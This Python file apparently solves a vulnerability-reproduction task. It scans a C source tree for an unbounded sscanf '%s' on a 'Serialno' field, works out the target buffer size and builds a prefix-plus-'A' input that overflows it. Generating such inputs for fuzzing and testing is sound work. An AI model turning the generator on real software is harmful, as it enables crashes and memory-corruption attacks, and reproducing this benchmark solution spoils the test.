import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def __init__(self) -> None:
        self._src_texts: List[Tuple[str, str]] = []

    def _iter_source_files_from_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".h", ".cc", ".cpp", ".cxx", ".y", ".l", ".inc", ".inl", ".m", ".mm"}
        for base, _, files in os.walk(root):
            for fn in files:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                path = os.path.join(base, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 8_000_000:
                    continue
                try:
                    with open(path, "rb") as f:
                        yield path, f.read()
                except OSError:
                    continue

    def _iter_source_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".h", ".cc", ".cpp", ".cxx", ".y", ".l", ".inc", ".inl", ".m", ".mm"}
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    _, ext = os.path.splitext(name)
                    if ext.lower() not in exts:
                        continue
                    if m.size <= 0 or m.size > 8_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield name, data
                    except Exception:
                        continue
        except Exception:
            return

    def _iter_source_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_source_files_from_dir(src_path)
            return
        if os.path.isfile(src_path):
            yield from self._iter_source_files_from_tar(src_path)
            return

    def _decode_text(self, b: bytes) -> str:
        try:
            return b.decode("utf-8", errors="ignore")
        except Exception:
            try:
                return b.decode("latin-1", errors="ignore")
            except Exception:
                return ""

    def _parse_defines(self, texts: List[Tuple[str, str]]) -> Dict[str, int]:
        defines: Dict[str, int] = {}
        # Simple integer defines: #define NAME 123
        re_def = re.compile(r'^\s*#\s*define\s+([A-Z_][A-Z0-9_]*)\s+([0-9]{1,9})\b', re.MULTILINE)
        for _, t in texts:
            for m in re_def.finditer(t):
                name = m.group(1)
                val = int(m.group(2))
                defines.setdefault(name, val)
        return defines

    def _eval_c_int_expr(self, expr: str, defines: Dict[str, int]) -> Optional[int]:
        expr = expr.strip()
        expr = expr.strip("()")
        if not expr:
            return None
        if "sizeof" in expr or "{" in expr or "}" in expr or "?" in expr or ":" in expr:
            return None
        expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.DOTALL).strip()
        expr = re.sub(r"//.*?$", "", expr, flags=re.MULTILINE).strip()
        if not expr:
            return None
        # Allow simple forms: INT, NAME, NAME+INT, INT+NAME, NAME-INT, INT-NAME, NAME+NAME
        if not re.fullmatch(r"[A-Za-z0-9_+\- \t]+", expr):
            return None

        tokens = re.split(r"([+\-])", expr.replace("\t", " ").replace(" ", ""))
        if not tokens:
            return None

        def term_val(tok: str) -> Optional[int]:
            if not tok:
                return None
            if tok.isdigit():
                try:
                    return int(tok)
                except Exception:
                    return None
            if tok in defines:
                return defines[tok]
            return None

        total: Optional[int] = None
        op = "+"
        for tok in tokens:
            if tok in {"+", "-"}:
                op = tok
                continue
            v = term_val(tok)
            if v is None:
                return None
            if total is None:
                total = v
            else:
                total = total + v if op == "+" else total - v
        if total is None or total <= 0 or total > 1_000_000:
            return None
        return total

    def _parse_char_array_decls(self, texts: List[Tuple[str, str]], defines: Dict[str, int]) -> Dict[str, int]:
        # Capture (unsigned)? char name[expr]
        re_decl = re.compile(
            r'\b(?:unsigned\s+)?char\s+([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*([^\]]{1,80})\s*\]',
            re.MULTILINE,
        )
        out: Dict[str, int] = {}
        for _, t in texts:
            for m in re_decl.finditer(t):
                name = m.group(1)
                expr = m.group(2)
                size = self._eval_c_int_expr(expr, defines)
                if size is None:
                    continue
                if size <= 0 or size > 4096:
                    continue
                out.setdefault(name, size)
        return out

    def _unescape_c_string(self, s: str) -> str:
        # Minimal C escape decoding sufficient for simple format strings.
        out = []
        i = 0
        n = len(s)
        while i < n:
            c = s[i]
            if c != "\\":
                out.append(c)
                i += 1
                continue
            i += 1
            if i >= n:
                break
            c2 = s[i]
            i += 1
            if c2 == "n":
                out.append("\n")
            elif c2 == "r":
                out.append("\r")
            elif c2 == "t":
                out.append("\t")
            elif c2 == "\\":
                out.append("\\")
            elif c2 == '"':
                out.append('"')
            elif c2 == "0":
                out.append("\0")
            elif c2 in "x":
                # \xNN
                hexpart = s[i:i + 2]
                if len(hexpart) == 2 and re.fullmatch(r"[0-9a-fA-F]{2}", hexpart):
                    try:
                        out.append(chr(int(hexpart, 16)))
                        i += 2
                    except Exception:
                        pass
            else:
                out.append(c2)
        return "".join(out)

    def _find_calls(self, text: str, fname: str, max_calls: int = 2000) -> List[str]:
        calls: List[str] = []
        pat = fname + "("
        idx = 0
        n = len(text)
        while idx < n and len(calls) < max_calls:
            i = text.find(pat, idx)
            if i == -1:
                break
            if i > 0 and (text[i - 1].isalnum() or text[i - 1] == "_"):
                idx = i + len(pat)
                continue
            start = i + len(fname)
            if start >= n or text[start] != "(":
                idx = i + len(pat)
                continue
            j = start
            depth = 0
            in_str = False
            esc = False
            while j < n:
                ch = text[j]
                if in_str:
                    if esc:
                        esc = False
                    elif ch == "\\":
                        esc = True
                    elif ch == '"':
                        in_str = False
                else:
                    if ch == '"':
                        in_str = True
                    elif ch == "(":
                        depth += 1
                    elif ch == ")":
                        depth -= 1
                        if depth == 0:
                            calls.append(text[i:j + 1])
                            idx = j + 1
                            break
                j += 1
            else:
                idx = i + len(pat)
        return calls

    def _split_args(self, call: str) -> List[str]:
        # call like 'sscanf(...)'
        p = call.find("(")
        q = call.rfind(")")
        if p == -1 or q == -1 or q <= p:
            return []
        inner = call[p + 1:q]
        args: List[str] = []
        cur = []
        depth = 0
        in_str = False
        esc = False
        i = 0
        n = len(inner)
        while i < n:
            ch = inner[i]
            if in_str:
                cur.append(ch)
                if esc:
                    esc = False
                elif ch == "\\":
                    esc = True
                elif ch == '"':
                    in_str = False
                i += 1
                continue
            if ch == '"':
                in_str = True
                cur.append(ch)
                i += 1
                continue
            if ch == "(" or ch == "[" or ch == "{":
                depth += 1
                cur.append(ch)
                i += 1
                continue
            if ch == ")" or ch == "]" or ch == "}":
                depth = max(0, depth - 1)
                cur.append(ch)
                i += 1
                continue
            if ch == "," and depth == 0:
                a = "".join(cur).strip()
                if a:
                    args.append(a)
                cur = []
                i += 1
                continue
            cur.append(ch)
            i += 1
        a = "".join(cur).strip()
        if a:
            args.append(a)
        return args

    def _extract_string_literal(self, token: str) -> Optional[str]:
        token = token.strip()
        if len(token) >= 2 and token[0] == '"' and token[-1] == '"':
            return self._unescape_c_string(token[1:-1])
        return None

    def _pick_prefix_and_bufsize(self, texts: List[Tuple[str, str]]) -> Tuple[bytes, int]:
        defines = self._parse_defines(texts)
        arrays = self._parse_char_array_decls(texts, defines)

        best_prefix: Optional[str] = None
        best_var: Optional[str] = None

        def is_unbounded_s(fmt: str) -> bool:
            # Unbounded %s: %s without digits immediately after %
            # Also ignore %%s (literal % then 's')
            for m in re.finditer(r"%(?!\d)s", fmt):
                if m.start() > 0 and fmt[m.start() - 1] == "%":
                    continue
                return True
            return False

        def prefix_from_fmt(fmt: str) -> Optional[str]:
            m = re.search(r"%(?!\d)s", fmt)
            if not m:
                return None
            p = fmt[:m.start()]
            # Normalize whitespace: any whitespace in sscanf format matches any whitespace.
            p = re.sub(r"\s+", " ", p)
            p = p.lstrip()
            return p

        for path, t in texts:
            if "sscanf" not in t:
                continue
            calls = self._find_calls(t, "sscanf", max_calls=200)
            if not calls:
                continue
            for call in calls:
                args = self._split_args(call)
                if len(args) < 3:
                    continue
                fmt = self._extract_string_literal(args[1])
                if fmt is None:
                    continue
                if ("Serialno" not in fmt) and ("SERIALNO" not in fmt) and ("serialno" not in fmt):
                    continue
                if "%s" not in fmt:
                    continue
                if not is_unbounded_s(fmt):
                    continue
                out_args = args[2:]
                var = None
                for oa in out_args:
                    m = re.search(r"\b([A-Za-z_][A-Za-z0-9_]*)\b", oa)
                    if not m:
                        continue
                    cand = m.group(1)
                    if "serial" in cand.lower():
                        var = cand
                        break
                if var is None and out_args:
                    m = re.search(r"\b([A-Za-z_][A-Za-z0-9_]*)\b", out_args[0])
                    if m:
                        var = m.group(1)

                pfx = prefix_from_fmt(fmt)
                if pfx:
                    best_prefix = pfx
                    best_var = var
                    break
            if best_prefix is not None:
                break

        bufsize = 16
        if best_var and best_var in arrays:
            bufsize = arrays[best_var]
        else:
            # Heuristic fallback: find any serial-related array size
            serial_sizes = [sz for name, sz in arrays.items() if "serial" in name.lower() and 1 <= sz <= 256]
            if serial_sizes:
                # Safer to overflow larger buffers as well; but keep modest.
                bufsize = max(serial_sizes)

        if best_prefix is None:
            # Prefer a prefix observed in code if possible
            joined = "\n".join(t for _, t in texts[:50])
            if '"Serialno:"' in joined or "Serialno:" in joined:
                best_prefix = "Serialno:"
            elif '"SERIALNO "' in joined or "SERIALNO " in joined:
                best_prefix = "SERIALNO "
            elif '"SERIALNO"' in joined or "SERIALNO" in joined:
                best_prefix = "SERIALNO "
            else:
                best_prefix = "Serialno:"

        # Ensure there's some separation unless prefix already ends with whitespace or a colon
        if best_prefix and (best_prefix[-1].isalnum() or best_prefix[-1] in ")]}"):
            best_prefix = best_prefix + " "
        # Keep exact colon style without forcing space; but "Serialno:" commonly used with whitespace in sscanf.
        # If it ends with ':', do not add extra if already present; whitespace can be matched flexibly.
        if best_prefix.endswith(":") and not best_prefix.endswith(": "):
            best_prefix = best_prefix  # no change

        try:
            pfx_bytes = best_prefix.encode("ascii", errors="ignore")
        except Exception:
            pfx_bytes = b"Serialno:"

        if not pfx_bytes:
            pfx_bytes = b"Serialno:"

        return pfx_bytes, bufsize

    def solve(self, src_path: str) -> bytes:
        texts: List[Tuple[str, str]] = []
        for name, data in self._iter_source_files(src_path):
            t = self._decode_text(data)
            if not t:
                continue
            texts.append((name, t))
            if len(texts) >= 800:
                break

        prefix, bufsize = self._pick_prefix_and_bufsize(texts)

        # Create a token that overflows: length >= bufsize (copying includes NUL), use bufsize+1 for safety.
        token_len = bufsize + 1
        # Guard against unrealistic sizes
        if token_len < 17:
            token_len = 17
        elif token_len > 256:
            token_len = 256

        # Keep it small if it matches the expected classic case
        if bufsize == 16:
            token_len = 17

        payload = prefix + (b"A" * token_len) + b"\n"
        return payload